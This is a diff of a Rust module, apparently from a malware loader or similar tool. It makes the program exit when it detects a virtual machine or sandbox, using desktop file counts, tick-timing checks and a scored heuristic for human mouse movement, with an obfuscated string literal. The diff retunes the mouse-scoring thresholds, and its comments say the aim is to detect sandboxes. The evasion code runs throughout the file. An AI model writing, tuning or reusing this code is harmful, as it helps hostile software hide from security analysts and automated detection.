@@ -10,42 +10,10 @@ pub fn guard_vm() {
 
     #[cfg(feature = "vm_check_desktop_files")]
     if !check_desktop_files(desktop_min) { process::exit(1); }
-
-
     #[cfg(feature = "vm_check_tick")]
     if is_tick_abnormal() { process::exit(1); }
     #[cfg(feature = "vm_check_mouse")]
     if !has_human_mouse_movement() { process::exit(1); }
-}
-
-#[cfg(feature = "vm_check_desktop_files")]
-#[allow(dead_code)]
-fn check_desktop_files(threshold: usize) -> bool {
-    use std::fs;
-    // 获取桌面路径
-    let desktop_path = match get_desktop_path() {
-        Some(path) => path,
-        None => return false,
-    };
-
-    let entries = match fs::read_dir(&desktop_path) {
-        Ok(entries) => entries,
-        Err(_) => return false,
-    };
-
-    let file_count = entries.filter_map(|entry| entry.ok()).count();
-
-    // 检查文件数量是否小于阈值
-    file_count >= threshold
-}
-
-#[cfg(feature = "vm_check_desktop_files")]
-#[allow(dead_code)]
-fn get_desktop_path() -> Option<PathBuf> {
-    use rustcrypt_ct_macros::obf_lit;
-    let home_dir = dirs::home_dir()?;
-    let desktop_str: String = obf_lit!("Desktop");
-    Some(home_dir.join(desktop_str))
 }
 
 #[cfg(feature = "vm_check_tick")]
@@ -107,7 +75,6 @@ pub fn has_human_mouse_movement() -> bool {
     use windows_sys::Win32::Foundation::POINT;
     use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
 
-    // 简单 LCG 随机，避免固定间隔导致脚本适配
     #[inline]
     fn simple_rand(seed: &mut u32) -> u32 {
         *seed = seed.wrapping_mul(1664525).wrapping_add(1013904223);
@@ -147,7 +114,7 @@ pub fn has_human_mouse_movement() -> bool {
         let get_tick: Option<unsafe extern "system" fn() -> u32> = p_tick.map(|f| transmute(f));
 
         // 采样参数
-        const N: usize = 4; // 采样点数量（增加到4以获得更多数据）
+        const N: usize = 3; // 采样点数量
         let mut points: [POINT; N] = [POINT { x: 0, y: 0 }; N];
         let mut ticks: [u32; N] = [0; N];
 
@@ -215,19 +182,52 @@ pub fn has_human_mouse_movement() -> bool {
             } else { false }
         } else { false };
 
-        // 打分规则（>=3 判定为人类，提高阈值以更好检测沙箱）
+        // 打分规则（>=2 判定为人类，降低采样点数后相应降低阈值）
         let mut score = 0u32;
-        // 1) 路径长度阈值（像素）：过滤微小抖动，提高到50
-        if total_dist >= 50.0 { score += 1; }
-        // 2) 存在至少两次明显转向（采样点增加后相应提高）
-        if turns >= 2 { score += 1; }
-        // 3) 速度波动适中（过于平滑或完全不动都不给分，提高到0.2）
-        if cov_v >= 0.2 { score += 1; }
-        // 4) 不完全直线（允许轻微直线操作，阈值降低到0.95）
-        if straight_eff <= 0.95 { score += 1; }
+        // 1) 路径长度阈值（像素）：过滤微小抖动
+        if total_dist >= 30.0 { score += 1; }
+        // 2) 存在至少一次明显转向（采样点少时可能无转向）
+        if turns >= 1 { score += 1; }
+        // 3) 速度波动适中（过于平滑或完全不动都不给分）
+        if cov_v >= 0.1 { score += 1; }
+        // 4) 不完全直线（允许轻微直线操作，阈值 0.98）
+        if straight_eff <= 0.98 { score += 1; }
         // 5) 近期有人机输入迹象
         if recent_input_bonus { score += 1; }
 
-        score >= 3
+        score >= 2
     }
 }
+
+
+#[cfg(feature = "vm_check_desktop_files")]
+#[allow(dead_code)]
+fn check_desktop_files(threshold: usize) -> bool {
+    use std::fs;
+    // 获取桌面路径
+    let desktop_path = match get_desktop_path() {
+        Some(path) => path,
+        None => return false,
+    };
+
+    let entries = match fs::read_dir(&desktop_path) {
+        Ok(entries) => entries,
+        Err(_) => return false,
+    };
+
+    let file_count = entries.filter_map(|entry| entry.ok()).count();
+
+    // 检查文件数量是否小于阈值
+    file_count >= threshold
+}
+
+#[cfg(feature = "vm_check_desktop_files")]
+#[allow(dead_code)]
+fn get_desktop_path() -> Option<PathBuf> {
+    use rustcrypt_ct_macros::obf_lit;
+    let home_dir = dirs::home_dir()?;
+    let desktop_str: String = obf_lit!("Desktop");
+    Some(home_dir.join(desktop_str))
+}
+
+
